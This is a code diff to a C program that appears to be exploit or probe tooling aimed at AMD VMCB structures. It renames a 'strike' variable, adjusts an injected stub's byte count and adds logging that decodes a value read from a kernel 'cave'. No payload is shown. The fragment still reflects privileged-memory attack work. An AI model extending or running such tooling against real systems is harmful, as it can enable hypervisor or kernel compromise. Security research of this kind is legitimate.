@@ -97,7 +97,7 @@
 #define STUB_QWORDS         24U
 #define PROBE_STEM          "fixed-ap-vmcb-early-late"
 #elif defined(AP_VMCB_STRIKE_1270)
-#define STUB_BYTES          223U
+#define STUB_BYTES          224U
 #define STUB_QWORDS         28U
 #define PROBE_STEM          "fixed-ap-vmcb-strike"
 #elif defined(AP_VMCB_SURVEY_1270)
@@ -563,7 +563,7 @@ int main(void)
   uint64_t survey_before = 0;
 #endif
 #ifdef AP_VMCB_STRIKE_1270
-  uint64_t strike_ctrl_before = 0;
+  uint64_t strike_packed_before = 0;
 #endif
 #ifdef AP_VMCB_EARLY_LATE_1270
   uint64_t scan_before[3] = {0};
@@ -590,8 +590,8 @@ int main(void)
       survey_before != 0
 #endif
 #ifdef AP_VMCB_STRIKE_1270
-      || read_qword(cave + KH_OFF_USER + 24, &strike_ctrl_before) != 0 ||
-      strike_ctrl_before != 0
+      || read_qword(cave + KH_OFF_USER + 24, &strike_packed_before) != 0 ||
+      strike_packed_before != 0
 #endif
 #ifdef AP_VMCB_EARLY_LATE_1270
       || kread(cave + KH_OFF_USER + 16, scan_before,
@@ -1008,9 +1008,9 @@ int main(void)
   int survey_read = read_qword(cave + KH_OFF_USER + 16, &survey_count);
 #endif
 #ifdef AP_VMCB_STRIKE_1270
-  uint64_t strike_ctrl = 0;
-  int strike_ctrl_read = read_qword(cave + KH_OFF_USER + 24,
-                                   &strike_ctrl);
+  uint64_t strike_packed = 0;
+  int strike_packed_read = read_qword(cave + KH_OFF_USER + 24,
+                                     &strike_packed);
 #endif
 #ifdef AP_VMCB_EARLY_LATE_1270
   uint64_t scan_values[3] = {0};
@@ -1076,7 +1076,9 @@ int main(void)
            ",survey_count=%" PRIu64 ",survey_read=%d"
 #endif
 #ifdef AP_VMCB_STRIKE_1270
-           ",reject_ctrl=0x%016" PRIx64 ",reject_ctrl_read=%d"
+           ",reject_packed=0x%016" PRIx64
+           ",reject_ctrl_low=0x%03" PRIx64
+           ",reject_root_page=0x%016" PRIx64 ",reject_read=%d"
 #endif
 #ifdef AP_VMCB_EARLY_LATE_1270
            ",early_ctrl=0x%016" PRIx64 ",late_ctrl=0x%016" PRIx64
@@ -1104,7 +1106,8 @@ int main(void)
            survey_count, survey_read,
 #endif
 #ifdef AP_VMCB_STRIKE_1270
-           strike_ctrl, strike_ctrl_read,
+           strike_packed, (uint64_t)(strike_packed & 0xfffULL),
+           (uint64_t)(strike_packed & ~0xfffULL), strike_packed_read,
 #endif
 #ifdef AP_VMCB_EARLY_LATE_1270
            scan_values[0], scan_values[1], scan_values[2], scan_read,
@@ -1153,7 +1156,7 @@ int main(void)
          survey_count == 16
 #endif
 #ifdef AP_VMCB_STRIKE_1270
-         && strike_ctrl_read == 0 && strike_ctrl == 0
+         && strike_packed_read == 0 && strike_packed == 0
 #endif
 #ifdef AP_VMCB_EARLY_LATE_1270
          && ap_marker == AP_MARKER && scan_read == 0 &&
